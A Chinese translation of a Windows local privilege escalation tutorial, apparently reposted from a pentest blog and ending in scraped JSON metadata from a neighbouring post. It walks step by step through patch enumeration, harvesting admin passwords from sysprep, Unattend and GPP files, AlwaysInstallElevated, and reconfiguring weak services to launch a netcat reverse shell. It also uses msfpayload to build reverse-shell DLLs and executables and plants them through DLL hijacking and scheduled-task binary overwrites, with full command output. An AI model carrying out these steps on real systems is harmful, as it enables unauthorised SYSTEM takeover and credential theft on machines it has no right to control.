CLASS&#x2F;PATH&#x2F;CONTEXT, type: (CLASS | PATH | CONTEXT) &#x2F;? 为简化起见，我创建了一个可以在目标机器上删除的脚本，该脚本将使用WMIC提取以下信息：进程，服务，用户帐户，用户组，网络接口，硬盘驱动器信息，网络共享信息，已安装的Windows补丁程序，启动时运行的程序，已安装软件的列表，有关操作系统和时区的信息。 如果有人想到应该添加到列表中的内容，我已经浏览了各种标志和参数来提取有价值的信息，请在下面留言。使用内置输出功能，脚本会将所有结果写入人类可读的html文件。 你可以在这里下载我的脚本（wmic_info.bat）Windows 7 VM上的示例输出文件（严重修补） - 此处 Δt for t5 to t6 - 快速失败 在继续之前，您应该花一点时间来查看您收集的信息，到目前为止应该有很多。我们的游戏计划的下一步是寻找一些快速安全性失败，可以轻松利用它来升级我们的用户权限。 我们需要关注的第一个也是最明显的事情是补丁级别。如果我们发现主机被严重修补，则无需进一步担心。我的WMIC脚本已经列出了所有已安装的补丁，但您可以在下面看到示例命令行输出。 C:\\Windows\\system32&gt; wmic qfe get Caption,Description,HotFixID,InstalledOn Caption Description HotFixID InstalledOn http:&#x2F;&#x2F;support.microsoft.com&#x2F;?kbid&#x3D;2727528 Security Update KB2727528 11&#x2F;23&#x2F;2013 http:&#x2F;&#x2F;support.microsoft.com&#x2F;?kbid&#x3D;2729462 Security Update KB2729462 11&#x2F;26&#x2F;2013 http:&#x2F;&#x2F;support.microsoft.com&#x2F;?kbid&#x3D;2736693 Security Update KB2736693 11&#x2F;26&#x2F;2013 http:&#x2F;&#x2F;support.microsoft.com&#x2F;?kbid&#x3D;2737084 Security Update KB2737084 11&#x2F;23&#x2F;2013 http:&#x2F;&#x2F;support.microsoft.com&#x2F;?kbid&#x3D;2742614 Security Update KB2742614 11&#x2F;23&#x2F;2013 http:&#x2F;&#x2F;support.microsoft.com&#x2F;?kbid&#x3D;2742616 Security Update KB2742616 11&#x2F;26&#x2F;2013 http:&#x2F;&#x2F;support.microsoft.com&#x2F;?kbid&#x3D;2750149 Update KB2750149 11&#x2F;23&#x2F;2013 http:&#x2F;&#x2F;support.microsoft.com&#x2F;?kbid&#x3D;2756872 Update KB2756872 11&#x2F;24&#x2F;2013 http:&#x2F;&#x2F;support.microsoft.com&#x2F;?kbid&#x3D;2756923 Security Update KB2756923 11&#x2F;26&#x2F;2013 http:&#x2F;&#x2F;support.microsoft.com&#x2F;?kbid&#x3D;2757638 Security Update KB2757638 11&#x2F;23&#x2F;2013 http:&#x2F;&#x2F;support.microsoft.com&#x2F;?kbid&#x3D;2758246 Update KB2758246 11&#x2F;24&#x2F;2013 http:&#x2F;&#x2F;support.microsoft.com&#x2F;?kbid&#x3D;2761094 Update KB2761094 11&#x2F;24&#x2F;2013 http:&#x2F;&#x2F;support.microsoft.com&#x2F;?kbid&#x3D;2764870 Update KB2764870 11&#x2F;24&#x2F;2013 http:&#x2F;&#x2F;support.microsoft.com&#x2F;?kbid&#x3D;2768703 Update KB2768703 11&#x2F;23&#x2F;2013 http:&#x2F;&#x2F;support.microsoft.com&#x2F;?kbid&#x3D;2769034 Update KB2769034 11&#x2F;23&#x2F;2013 http:&#x2F;&#x2F;support.microsoft.com&#x2F;?kbid&#x3D;2769165 Update KB2769165 11&#x2F;23&#x2F;2013 http:&#x2F;&#x2F;support.microsoft.com&#x2F;?kbid&#x3D;2769166 Update KB2769166 11&#x2F;26&#x2F;2013 http:&#x2F;&#x2F;support.microsoft.com&#x2F;?kbid&#x3D;2770660 Security Update KB2770660 11&#x2F;23&#x2F;2013 http:&#x2F;&#x2F;support.microsoft.com&#x2F;?kbid&#x3D;2770917 Update KB2770917 11&#x2F;24&#x2F;2013 http:&#x2F;&#x2F;support.microsoft.com&#x2F;?kbid&#x3D;2771821 Update KB2771821 11&#x2F;24&#x2F;2013 [..Snip..] 与Windows一样，输出并不完全可以使用。最好的策略是查找权限提升漏洞并查找各自的KB补丁号。此类攻击包括但不限于KiTrap0D（KB979682），MS11-011（KB2393802），MS10-059（KB982799），MS10-021（KB979683），MS11-080（KB2592799）。在枚举操作系统版本和Service Pack之后，您应该找出可能存在哪些权限升级漏洞。使用KB修补程序编号，您可以grep已安装的修补程序以查看是否缺少任何修补程序。 您可以在下面看到grep补丁的语法： C:\\Windows\\system32&gt; wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr &#x2F;C:&quot;KB..&quot; &#x2F;C:&quot;KB..&quot; 接下来我们将看看大规模推出。如果存在需要安装许多机器的环境，通常，技术人员不会在机器之间四处走动。有几种解决方案可以自动安装机器。这些方法是什么以及它们如何工作对我们的目的来说不那么重要，但主要的是它们留下了用于安装过程的配置文件。这些配置文件包含许多敏感的敏感信息，例如操作系统产品密钥和管理员密码。我们最感兴趣的是管理员密码，因为我们可以使用它来提升我们的权限。 通常这些是包含配置文件的目录（但检查整个操作系统是个好主意）： c:\\sysprep.inf c:\\sysprep\\sysprep.xml ％WINDIR％\\Panther\\Unattend\\Unattended.xml ％WINDIR％\\Panther\\Unattended.xml 这些文件包含明文密码或Base64编码格式。您可以在下面看到一些示例文件输出。 # This is a sample from sysprep.inf with clear-text credentials. # This is a sample from sysprep.inf with clear-text credentials. [GuiUnattended] OEMSkipRegional&#x3D;1 OemSkipWelcome&#x3D;1 AdminPassword&#x3D;s3cr3tp4ssw0rd TimeZone&#x3D;20 # This is a sample from sysprep.xml with Base64 &quot;encoded&quot; credentials. Please people Base64 is not encryption, I take more precautions to protect my coffee. The password here is &quot;SuperSecurePassword&quot;. &lt;LocalAccounts&gt; &lt;LocalAccount wcm:action&#x3D;&quot;add&quot;&gt; &lt;Password&gt; &lt;Value&gt;U3VwZXJTZWN1cmVQYXNzd29yZA&#x3D;&#x3D;&lt;&#x2F;Value&gt; &lt;PlainText&gt;false&lt;&#x2F;PlainText&gt; &lt;&#x2F;Password&gt; &lt;Description&gt;Local Administrator&lt;&#x2F;Description&gt; &lt;DisplayName&gt;Administrator&lt;&#x2F;DisplayName&gt; &lt;Group&gt;Administrators&lt;&#x2F;Group&gt; &lt;Name&gt;Administrator&lt;&#x2F;Name&gt; &lt;&#x2F;LocalAccount&gt; &lt;&#x2F;LocalAccounts&gt; # Sample from Unattended.xml with the same &quot;secure&quot; Base64 encoding. &lt;AutoLogon&gt; &lt;Password&gt; &lt;Value&gt;U3VwZXJTZWN1cmVQYXNzd29yZA&#x3D;&#x3D;&lt;&#x2F;Value&gt; &lt;PlainText&gt;false&lt;&#x2F;PlainText&gt; &lt;&#x2F;Password&gt; &lt;Enabled&gt;true&lt;&#x2F;Enabled&gt; &lt;Username&gt;Administrator&lt;&#x2F;Username&gt; &lt;&#x2F;AutoLogon&gt; 根据Ben Campbell（@Meatballs__）的推荐，我将组策略首选项保存的密码添加到快速失败列表中。GPO首选项文件可用于在域计算机上创建本地用户。当您妥协的框连接到域时，非常值得查找存储在SYSVOL中的Groups.xml文件。任何经过身份验证的用户都具有对此文件的读取权限。xml文件中的密码通过使用AES加密来从临时用户“隐藏”，我说模糊，因为静态密钥在msdn网站上发布，允许轻松解密存储的值。 除了Groups.xml之外，其他几个策略首选项文件还可以设置可选的“cPassword”属性：Services \\ Services.xml：特定于元素的属性ScheduledTasks \\ ScheduledTasks.xml：任务内部元素，TaskV2内部元素，ImmediateTaskV2内部元素打印机\\ Printers.xml：SharedPrinter元素驱动器\\ Drives.xml：元素特定属性DataSources \\ DataSources.xml：元素特定属性 可以通过手动浏览SYSVOL并抓取相关文件来利用此漏洞，如下所示。 然而，我们都喜欢自动化解决方案，因此我们可以尽快到达终点。这里有两个主要选项，具体取决于我们拥有的shell /访问类型。有（1）metasploit模块可以通过此处建立的会话执行，或者（2）您可以使用Get-GPPPassword，它是PowerSploit的一部分。PowerSploit是Matt Graeber的优秀PowerShell框架，专为逆向工程，取证和测试而量身定制。 接下来我们将寻找一个奇怪的注册表设置“AlwaysInstallElevated”，如果启用此设置，它允许任何权限级别的用户将* .msi文件安装为NT AUTHORITY \\ SYSTEM。对我来说，创建低权限用户（限制他们使用操作系统）但让他们能够以SYSTEM身份安装程序似乎是一个奇怪的想法。有关此问题的更多背景阅读，您可以在这里查看来自GreyHatHacker的Parvez的一篇文章，该文章最初将此报告为安全问题。 为了能够使用它，我们需要检查是否设置了两个注册表项，如果是这种情况我们可以弹出一个SYSTEM shell。您可以看到sytntax查询下面的相应注册表项。 # This will only work if both registry keys contain &quot;AlwaysInstallElevated&quot; with DWORD values of 1. C:\\Windows\\system32&gt; reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated C:\\Windows\\system32&gt; reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated 为了完成这一部分，我们将对操作系统进行一些快速搜索，希望我们能够获得金牌。您可以在下面看到我们搜索的语法。 # The command below will search the file system for file names containing certain keywords. You can specify as many keywords as you wish. C:\\Windows\\system32&gt; dir &#x2F;s *pass* &#x3D;&#x3D; *cred* &#x3D;&#x3D; *vnc* &#x3D;&#x3D; *.config* # Search certain file types for a keyword, this can generate a lot of output. C:\\Windows\\system32&gt; findstr &#x2F;si password *.xml *.ini *.txt # Similarly the two commands below can be used to grep the registry for keywords, in this case &quot;password&quot;. C:\\Windows\\system32&gt; reg query HKLM &#x2F;f password &#x2F;t REG_SZ &#x2F;s C:\\Windows\\system32&gt; reg query HKCU &#x2F;f password &#x2F;t REG_SZ &#x2F;s Δt for t7 to t10 - 卷起你的袖子 希望到现在为止我们已经拥有了一个SYSTEM shell，但如果我们不这样做，那么仍有一些攻击途径需要仔细阅读。在最后一部分中，我们将介绍Windows服务和文件/文件夹权限。我们的目标是使用弱权限来提升会话权限。 我们将检查大量访问权限，因此我们应该获取accesschk.exe的副本，这是Microsoft的Sysinternals Suite中的一个工具。Microsoft Sysinternals包含许多优秀的工具，很遗憾微软没有将它们添加到标准的Windows版本中。您可以在此处从Microsoft technet下载该套件。 我们将从Windows服务开始，因为那里有一些快速的胜利。通常，现代操作系统不包含易受攻击的服务。在这种情况下，易受攻击意味着我们可以重新配置服务参数。Windows服务有点像应用程序快捷方式，请看下面的例子 # We can use sc to query, configure and manage windows services. C:\\Windows\\system32&gt; sc qc Spooler [SC] QueryServiceConfig SUCCESS SERVICE_NAME: Spooler TYPE : 110 WIN32_OWN_PROCESS (interactive) START_TYPE : 2 AUTO_START ERROR_CONTROL : 1 NORMAL BINARY_PATH_NAME : C:\\Windows\\System32\\spoolsv.exe LOAD_ORDER_GROUP : SpoolerGroup TAG : 0 DISPLAY_NAME : Print Spooler DEPENDENCIES : RPCSS : http SERVICE_START_NAME : LocalSystem 我们可以使用accesschk检查每个服务所需的权限级别。 # We can see the permissions that each user level has, you can also use &quot;accesschk.exe -ucqv *&quot; to list all services. C:\\&gt; accesschk.exe -ucqv Spooler Spooler R NT AUTHORITY\\Authenticated Users SERVICE_QUERY_STATUS SERVICE_QUERY_CONFIG SERVICE_INTERROGATE SERVICE_ENUMERATE_DEPENDENTS SERVICE_USER_DEFINED_CONTROL READ_CONTROL R BUILTIN\\Power Users SERVICE_QUERY_STATUS SERVICE_QUERY_CONFIG SERVICE_INTERROGATE SERVICE_ENUMERATE_DEPENDENTS SERVICE_START SERVICE_USER_DEFINED_CONTROL READ_CONTROL RW BUILTIN\\Administrators SERVICE_ALL_ACCESS RW NT AUTHORITY\\SYSTEM SERVICE_ALL_ACCESS Accesschk可以自动检查我们是否具有对具有特定用户级别的Windows服务的写访问权。通常作为低权限用户，我们将要检查“Authenticated Users”。确保检查您的用户所属的用户组，例如“Power Users”被视为低权限用户组（尽管它没有被广泛使用）。 让我们比较Windows 8和Windows XP SP0上的输出。 # This is on Windows 8. C:\\Users\\b33f\\tools\\Sysinternals&gt; accesschk.exe -uwcqv &quot;Authenticated Users&quot; * No matching objects found. # On a default Windows XP SP0 we can see there is a pretty big security fail. C:\\&gt; accesschk.exe -uwcqv &quot;Authenticated Users&quot; * RW SSDPSRV SERVICE_ALL_ACCESS RW upnphost SERVICE_ALL_ACCESS C:\\&gt; accesschk.exe -ucqv SSDPSRV SSDPSRV RW NT AUTHORITY\\SYSTEM SERVICE_ALL_ACCESS RW BUILTIN\\Administrators SERVICE_ALL_ACCESS RW NT AUTHORITY\\Authenticated Users SERVICE_ALL_ACCESS RW BUILTIN\\Power Users SERVICE_ALL_ACCESS RW NT AUTHORITY\\LOCAL SERVICE SERVICE_ALL_ACCESS C:\\&gt; accesschk.exe -ucqv upnphost upnphost RW NT AUTHORITY\\SYSTEM SERVICE_ALL_ACCESS RW BUILTIN\\Administrators SERVICE_ALL_ACCESS RW NT AUTHORITY\\Authenticated Users SERVICE_ALL_ACCESS RW BUILTIN\\Power Users SERVICE_ALL_ACCESS RW NT AUTHORITY\\LOCAL SERVICE SERVICE_ALL_ACCESS 此问题后来通过引入XP SP2解决，但是在SP0和SP1上，它可以用作通用本地权限提升漏洞。通过重新配置服务，我们可以让它以SYSTEM级别权限运行我们选择的任何二进制文件。 我们来看看这是如何在实践中完成的。在这种情况下，服务将执行netcat并打开具有SYSTEM级别权限的反向shell。其他选择当然是可能的。 C:\\&gt; sc qc upnphost [SC] GetServiceConfig SUCCESS SERVICE_NAME: upnphost TYPE : 20 WIN32_SHARE_PROCESS START_TYPE : 3 DEMAND_START ERROR_CONTROL : 1 NORMAL BINARY_PATH_NAME : C:\\WINDOWS\\System32\\svchost.exe -k LocalService LOAD_ORDER_GROUP : TAG : 0 DISPLAY_NAME : Universal Plug and Play Device Host DEPENDENCIES : SSDPSRV SERVICE_START_NAME : NT AUTHORITY\\LocalService C:\\&gt; sc config upnphost binpath&#x3D; &quot;C:\\nc.exe -nv 127.0.0.1 9988 -e C:\\WINDOWS\\System32\\cmd.exe&quot; [SC] ChangeServiceConfig SUCCESS C:\\&gt; sc config upnphost obj&#x3D; &quot;.\\LocalSystem&quot; password&#x3D; &quot;&quot; [SC] ChangeServiceConfig SUCCESS C:\\&gt; sc qc upnphost [SC] GetServiceConfig SUCCESS SERVICE_NAME: upnphost TYPE : 20 WIN32_SHARE_PROCESS START_TYPE : 3 DEMAND_START ERROR_CONTROL : 1 NORMAL BINARY_PATH_NAME : C:\\nc.exe -nv 127.0.0.1 9988 -e C:\\WINDOWS\\System32\\cmd.exe LOAD_ORDER_GROUP : TAG : 0 DISPLAY_NAME : Universal Plug and Play Device Host DEPENDENCIES : SSDPSRV SERVICE_START_NAME : LocalSystem C:\\&gt; net start upnphost Service Shell (upnphost) 即使配置不正确，我们也不会始终拥有对服务的完全访问权限。下图来自Brett Moore关于Windows权限升级的演示文稿，这些访问权限中的任何一个都将为我们提供一个SYSTEM shell。 需要记住的重要一点是，我们会发现我们的受感染会话所属的用户组。如前所述，“Power Users”也被视为低权限用户组。“Power Users”有各自的漏洞，Mark Russinovich写了一篇关于这个主题的非常有趣的文章。 Power in Power用户（Mark Russinovich） - 这里 最后我们将检查文件/文件夹权限，如果我们不能直接攻击操作系统，我们将让操作系统完成所有的工作。这里有很多内容，所以我将向您展示两种权限漏洞以及如何利用它们。一旦掌握了总体思路，您就可以将这些技术应用于其他情境。 对于我们的第一个例子，我们将复制Parvez从GreyHatHacker写的一篇文章的结果; “通过利用弱文件夹权限提升权限”。这是一个很好的特权升级写作，我强烈建议你在这里阅读他的帖子。 此示例是DLL劫持的特例。程序通常不能自己运行，它们需要很多资源（大多数是DLL，但也有专有文件）。如果程序或服务从我们具有写访问权限的目录加载文件，我们可以滥用它来弹出具有程序运行权限的shell。 通常，Windows应用程序将使用预定义的搜索路径来查找DLL，并且它将按特定顺序检查这些路径。DLL劫持通常是通过将恶意DLL放在其中一个路径中，同时确保在合法DLL之前找到DLL来实现的。通过让应用程序指定它所需的DLL的绝对路径，可以减轻此问题。 您可以在以下32位系统上看到DLL搜索顺序：1 - 应用程序加载的目录2 - 32位系统目录（C：\\ Windows \\ System32）3 - 16位系统目录（C：\\ Windows \\ System）4 - Windows目录（C：\\ Windows）5 - 当前工作目录（CWD）6 - PATH环境变量中的目录（系统然后用户） 有时会发生应用程序尝试加载机器上不存在的DLL。这可能由于多种原因而发生，例如，如果仅对某些插件或未安装的功能需要DLL。在这种情况下，Parvez发现某些Windows服务尝试加载默认安装中不存在的DLL。 由于有问题的DLL不存在，我们将最终遍历所有搜索路径。作为一个低权限用户，我们没有希望将恶意DLL放入1-4中，在这种情况下不可能出现这种情况，因为我们讨论的是Windows服务但是如果我们对Windows PATH中的任何目录都有写访问权限我们赢了。 让我们看看它在实践中是如何工作的，对于我们的示例，我们将使用试图加载wlbsctrl.dll的IKEEXT（IKE和AuthIP IPsec Keying Modules）服务。 # This is on Windows 7 as low privilege user1. C:\\Users\\user1\\Desktop&gt; echo %username% user1 # We have a win here since any non-default directory in &quot;C:\\&quot; will give write access to authenticated users. C:\\Users\\user1\\Desktop&gt; echo %path% C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\; C:\\Program Files\\OpenVPN\\bin;C:\\Python27 # We can check our access permissions with accesschk or cacls. C:\\Users\\user1\\Desktop&gt; accesschk.exe -dqv &quot;C:\\Python27&quot; C:\\Python27 Medium Mandatory Level (Default) [No-Write-Up] RW BUILTIN\\Administrators FILE_ALL_ACCESS RW NT AUTHORITY\\SYSTEM FILE_ALL_ACCESS R BUILTIN\\Users FILE_LIST_DIRECTORY FILE_READ_ATTRIBUTES FILE_READ_EA FILE_TRAVERSE SYNCHRONIZE READ_CONTROL RW NT AUTHORITY\\Authenticated Users FILE_ADD_FILE FILE_ADD_SUBDIRECTORY FILE_LIST_DIRECTORY FILE_READ_ATTRIBUTES FILE_READ_EA FILE_TRAVERSE FILE_WRITE_ATTRIBUTES FILE_WRITE_EA DELETE SYNCHRONIZE READ_CONTROL C:\\Users\\user1\\Desktop&gt; cacls &quot;C:\\Python27&quot; C:\\Python27 BUILTIN\\Administrators:(ID)F BUILTIN\\Administrators:(OI)(CI)(IO)(ID)F NT AUTHORITY\\SYSTEM:(ID)F NT AUTHORITY\\SYSTEM:(OI)(CI)(IO)(ID)F BUILTIN\\Users:(OI)(CI)(ID)R NT AUTHORITY\\Authenticated Users:(ID)C NT AUTHORITY\\Authenticated Users:(OI)(CI)(IO)(ID)C # Before we go over to action we need to check the status of the IKEEXT service. In this case we can see it is set to &quot;AUTO_START&quot; so it will launch on boot! C:\\Users\\user1\\Desktop&gt; sc qc IKEEXT [SC] QueryServiceConfig SUCCESS SERVICE_NAME: IKEEXT TYPE : 20 WIN32_SHARE_PROCESS START_TYPE : 2 AUTO_START ERROR_CONTROL : 1 NORMAL BINARY_PATH_NAME : C:\\Windows\\system32\\svchost.exe -k netsvcs LOAD_ORDER_GROUP : TAG : 0 DISPLAY_NAME : IKE and AuthIP IPsec Keying Modules DEPENDENCIES : BFE SERVICE_START_NAME : LocalSystem 现在我们知道满足必要条件我们可以生成恶意DLL并弹出shell！ root@darkside:~# msfpayload windows&#x2F;shell_reverse_tcp lhost&#x3D;&#39;127.0.0.1&#39; lport&#x3D;&#39;9988&#39; O Name: Windows Command Shell, Reverse TCP Inline Module: payload&#x2F;windows&#x2F;shell_reverse_tcp Platform: Windows Arch: x86 Needs Admin: No Total size: 314 Rank: Normal Provided by: vlad902 &lt;vlad902@gmail.com&gt; sf &lt;stephen_fewer@harmonysecurity.com&gt; Basic options: Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC process yes Exit technique: seh, thread, process, none LHOST 127.0.0.1 yes The listen address LPORT 9988 yes The listen port Description: Connect back to attacker and spawn a command shell root@darkside:~# msfpayload windows&#x2F;shell_reverse_tcp lhost&#x3D;&#39;127.0.0.1&#39; lport&#x3D;&#39;9988&#39; D &gt; &#x2F;root&#x2F;Desktop&#x2F;evil.dll Created by msfpayload (http:&#x2F;&#x2F;www.metasploit.com). Payload: windows&#x2F;shell_reverse_tcp Length: 314 Options: &#123;&quot;lhost&quot;&#x3D;&gt;&quot;127.0.0.1&quot;, &quot;lport&quot;&#x3D;&gt;&quot;9988&quot;&#125; 将DLL传输到目标机器后，我们需要做的就是将其重命名为wlbsctrl.dll并将其移动到“C:\\Python27”。一旦完成，我们需要耐心地等待机器重新启动（或者我们可以尝试强制重启），我们将获得一个SYSTEM shell。 # Again, this is as low privilege user1. C:\\Users\\user1\\Desktop&gt; dir Volume in drive C has no label. Volume Serial Number is 948D-A98F Directory of C:\\Users\\user1\\Desktop 02&#x2F;18&#x2F;2014 01:49 PM &lt;DIR&gt; . 02&#x2F;18&#x2F;2014 01:49 PM &lt;DIR&gt; .. 04&#x2F;22&#x2F;2013 09:39 AM 331,888 accesschk.exe 02&#x2F;18&#x2F;2014 12:38 PM 14,336 evil.dll 01&#x2F;25&#x2F;2014 12:46 AM 36,864 fubar.exe 01&#x2F;22&#x2F;2014 08:17 AM &lt;DIR&gt; incognito2 06&#x2F;30&#x2F;2011 01:52 PM 1,667,584 ncat.exe 11&#x2F;22&#x2F;2013 07:39 PM 1,225 wmic_info.bat 5 File(s) 2,051,897 bytes 3 Dir(s) 73,052,160 bytes free C:\\Users\\user1\\Desktop&gt; copy evil.dll C:\\Python27\\wlbsctrl.dll 1 file(s) copied. C:\\Users\\user1\\Desktop&gt; dir C:\\Python27 Volume in drive C has no label. Volume Serial Number is 948D-A98F Directory of C:\\Python27 02&#x2F;18&#x2F;2014 01:53 PM &lt;DIR&gt; . 02&#x2F;18&#x2F;2014 01:53 PM &lt;DIR&gt; .. 10&#x2F;20&#x2F;2012 02:52 AM &lt;DIR&gt; DLLs 10&#x2F;20&#x2F;2012 02:52 AM &lt;DIR&gt; Doc 10&#x2F;20&#x2F;2012 02:52 AM &lt;DIR&gt; include 01&#x2F;28&#x2F;2014 03:45 AM &lt;DIR&gt; Lib 10&#x2F;20&#x2F;2012 02:52 AM &lt;DIR&gt; libs 04&#x2F;10&#x2F;2012 11:34 PM 40,092 LICENSE.txt 04&#x2F;10&#x2F;2012 11:18 PM 310,875 NEWS.txt 04&#x2F;10&#x2F;2012 11:31 PM 26,624 python.exe 04&#x2F;10&#x2F;2012 11:31 PM 27,136 pythonw.exe 04&#x2F;10&#x2F;2012 11:18 PM 54,973 README.txt 10&#x2F;20&#x2F;2012 02:52 AM &lt;DIR&gt; tcl 10&#x2F;20&#x2F;2012 02:52 AM &lt;DIR&gt; Tools 04&#x2F;10&#x2F;2012 11:31 PM 49,664 w9xpopen.exe 02&#x2F;18&#x2F;2014 12:38 PM 14,336 wlbsctrl.dll 7 File(s) 523,700 bytes 9 Dir(s) 73,035,776 bytes free 一切都已设置，我们现在需要做的就是等待系统重启。出于演示目的，我在下面包含了一个屏幕截图，我使用管理员命令提示符手动重启服务。 [ Service Shell (IKEEXT) 对于我们的最后一个例子，我们将查看计划的任务。回顾我们之前收集的结果，我们遇到了以下条目。 HostName: B33F TaskName: \\LogGrabberTFTP Next Run Time: 2&#x2F;19&#x2F;2014 9:00:00 AM Status: Ready Logon Mode: Interactive&#x2F;Background Last Run Time: N&#x2F;A Last Result: 1 Author: B33F\\b33f Task To Run: E:\\GrabLogs\\tftp.exe 10.1.1.99 GET log.out E:\\GrabLogs\\Logs\\log.txt Start In: N&#x2F;A Comment: N&#x2F;A Scheduled Task State: Enabled Idle Time: Disabled Power Management: Stop On Battery Mode, No Start On Batteries Run As User: SYSTEM Delete Task If Not Rescheduled: Enabled Stop Task If Runs X Hours and X Mins: 72:00:00 Schedule: Scheduling data is not available in this format. Schedule Type: Daily Start Time: 9:00:00 AM Start Date: 2&#x2F;17&#x2F;2014 End Date: N&#x2F;A Days: Every 1 day(s) Months: N&#x2F;A Repeat: Every: Disabled Repeat: Until: Time: Disabled Repeat: Until: Duration: Disabled Repeat: Stop If Still Running: Disabled 盒子上似乎有一个TFTP客户端连接到远程主机并抓取某种日志文件。我们可以看到此任务每天上午9点运行，并以SYSTEM级别权限（ouch）运行。让我们看看我们是否具有对此文件夹的写入权限。 C:\\Users\\user1\\Desktop&gt; accesschk.exe -dqv &quot;E:\\GrabLogs&quot; E:\\GrabLogs Medium Mandatory Level (Default) [No-Write-Up] RW BUILTIN\\Administrators FILE_ALL_ACCESS RW NT AUTHORITY\\SYSTEM FILE_ALL_ACCESS RW NT AUTHORITY\\Authenticated Users FILE_ADD_FILE FILE_ADD_SUBDIRECTORY FILE_LIST_DIRECTORY FILE_READ_ATTRIBUTES FILE_READ_EA FILE_TRAVERSE FILE_WRITE_ATTRIBUTES FILE_WRITE_EA DELETE SYNCHRONIZE READ_CONTROL R BUILTIN\\Users FILE_LIST_DIRECTORY FILE_READ_ATTRIBUTES FILE_READ_EA FILE_TRAVERSE SYNCHRONIZE READ_CONTROL C:\\Users\\user1\\Desktop&gt; dir &quot;E:\\GrabLogs&quot; Volume in drive E is More Volume Serial Number is FD53-2F00 Directory of E:\\GrabLogs 02&#x2F;18&#x2F;2014 11:34 PM &lt;DIR&gt; . 02&#x2F;18&#x2F;2014 11:34 PM &lt;DIR&gt; .. 02&#x2F;18&#x2F;2014 11:34 PM &lt;DIR&gt; Logs 02&#x2F;18&#x2F;2014 09:21 PM 180,736 tftp.exe 1 File(s) 180,736 bytes 3 Dir(s) 5,454,602,240 bytes free 显然，这是一个严重的配置问题，不需要将此任务作为SYSTEM运行，但更糟糕的是任何经过身份验证的用户都具有对该文件夹的写入权限。理想情况下，我会抓住TFTP客户端，后备PE可执行文件，同时确保它仍能完美运行，然后将其放回目标计算机上。但是，出于本示例的目的，我们可以使用metasploit生成的可执行文件简单地覆盖二进制文件。 root@darkside:~# msfpayload windows&#x2F;shell_reverse_tcp lhost&#x3D;&#39;127.0.0.1&#39; lport&#x3D;&#39;9988&#39; O Name: Windows Command Shell, Reverse TCP Inline Module: payload&#x2F;windows&#x2F;shell_reverse_tcp Platform: Windows Arch: x86 Needs Admin: No Total size: 314 Rank: Normal Provided by: vlad902 &lt;vlad902@gmail.com&gt; sf &lt;stephen_fewer@harmonysecurity.com&gt; Basic options: Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC process yes Exit technique: seh, thread, process, none LHOST 127.0.0.1 yes The listen address LPORT 9988 yes The listen port Description: Connect back to attacker and spawn a command shell root@darkside:~# msfpayload windows&#x2F;shell_reverse_tcp lhost&#x3D;&#39;127.0.0.1&#39; lport&#x3D;&#39;9988&#39; R | msfencode -t exe &gt; &#x2F;root&#x2F;Desktop&#x2F;evil-tftp.exe [*] x86&#x2F;shikata_ga_nai succeeded with size 341 (iteration&#x3D;1) 现在剩下的就是上传我们的恶意可执行文件并覆盖“E：\\ GrabLogs \\ tftp.exe”。一旦完成，我们可以在早上睡个好觉，然后在早上醒来。这里要记住的一件重要事情是我们检查我们试图妥协的盒子上的时间/时区。 C:\\Users\\user1\\Desktop&gt; dir Volume in drive C has no label. Volume Serial Number is 948D-A98F Directory of C:\\Users\\user1\\Desktop 02&#x2F;19&#x2F;2014 01:36 AM &lt;DIR&gt; . 02&#x2F;19&#x2F;2014 01:36 AM &lt;DIR&gt; .. 04&#x2F;22&#x2F;2013 09:39 AM 331,888 accesschk.exe 02&#x2F;19&#x2F;2014 01:31 AM 73,802 evil-tftp.exe 01&#x2F;25&#x2F;2014 12:46 AM 36,864 fubar.exe 01&#x2F;22&#x2F;2014 08:17 AM &lt;DIR&gt; incognito2 06&#x2F;30&#x2F;2011 01:52 PM 1,667,584 ncat.exe 02&#x2F;18&#x2F;2014 12:38 PM 14,336 wlbsctrl.dll 11&#x2F;22&#x2F;2013 07:39 PM 1,225 wmic_info.bat 6 File(s) 2,125,699 bytes 3 Dir(s) 75,341,824 bytes free C:\\Users\\user1\\Desktop&gt; copy evil-tftp.exe E:\\GrabLogs\\tftp.exe Overwrite E:\\GrabLogs\\tftp.exe? (Yes&#x2F;No&#x2F;All): Yes 1 file(s) copied. 为了演示此操作中的权限提升，我快速转发了系统时间。从下面的屏幕截图中我们可以看到我们在上午9点迅速提供了我们的SYSTEM shell。 Schtasks Shell (LogGrabberTFTP) 这两个示例应该让您了解在考虑文件/文件夹权限时我们需要查找的漏洞类型。您需要花时间检查Windows服务，计划任务和启动任务的所有bin路径。 我们已经能够看到accesschk是这里的首选工具。在结束之前，我想给你一些关于使用accesschk的最后一点。 # When executing any of the sysinternals tools for the first time the user will be presented with a GUI pop-up to accept the EULA. This is obviously a big problem, however we can add an extra command line flag to automatically accept the EULA. accesschk.exe &#x2F;accepteula ... ... ... # Find all weak folder permissions per drive. accesschk.exe -uwdqs Users c:\\ accesschk.exe -uwdqs &quot;Authenticated Users&quot; c:\\ # Find all weak file permissions per drive. accesschk.exe -uwqs Users c:\\*.* accesschk.exe -uwqs &quot;Authenticated Users&quot; c:\\*.* Final Thoughts 本指南旨在成为Windows权限升级的“基础”。如果你想真正掌握这门课程，你需要投入大量的工作和研究。与测试的所有方面一样，枚举是关键，你对目标的了解越多，你拥有的攻击途径越多，成功率就越高。 另请注意，您有时可能会将您的权限提升为管理员。从管理员升级到SYSTEM的权限不是问题，您始终可以重新配置服务或创建具有SYSTEM级别权限的计划任务。 现在出去弹出SYSTEM !!","categories":[],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://misakikata.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}]},{"title":"python遍历路径破解表单","slug":"python遍历路径破解表单","date":"2019-03-12T02:35:27.000Z","updated":"2019-03-12T02:53:37.000Z","comments":true,"path":"2019/03/python遍历路径破解表单/","link":"","permalink":"https://misakikata.github.io/2019/03/python%E9%81%8D%E5%8E%86%E8%B7%AF%E5%BE%84%E7%A0%B4%E8%A7%A3%E8%A1%A8%E5%8D%95/","excerpt":"","text":"python遍历路径破解表单​ 